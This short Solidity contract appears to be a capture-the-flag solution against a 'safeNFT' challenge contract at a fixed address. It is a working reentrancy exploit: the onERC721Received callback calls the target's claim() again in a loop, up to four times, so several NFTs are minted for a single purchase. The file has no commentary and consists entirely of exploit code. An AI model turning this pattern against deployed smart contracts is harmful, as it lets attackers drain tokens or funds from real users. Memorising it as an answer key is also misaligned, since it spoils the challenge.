// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "../instances/safeNFT.sol";


contract Solution  {
    uint8 count = 0;
    safeNFT target = safeNFT(0xf0337Cde99638F8087c670c80a57d470134C3AAE);

    function buy() public payable {
        target.buyNFT{value:msg.value}();
    }

    function claim() public {
        target.claim();
    }
 
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) public returns (bytes4) {
        while (count < 4) {
            count++;
            target.claim();
        }
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}

